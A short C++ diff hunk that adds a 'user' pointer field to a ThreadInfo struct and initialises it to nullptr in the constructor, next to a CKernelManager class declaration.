@@ -20,7 +20,8 @@ struct ThreadInfo
 	BOOL run;
 	HANDLE h;
 	IOCPClient *p;
-	ThreadInfo() : run(TRUE), h(NULL), p(NULL){ }
+	void* user;
+	ThreadInfo() : run(TRUE), h(NULL), p(NULL), user(nullptr){ }
 };
 
 class CKernelManager : public CManager  
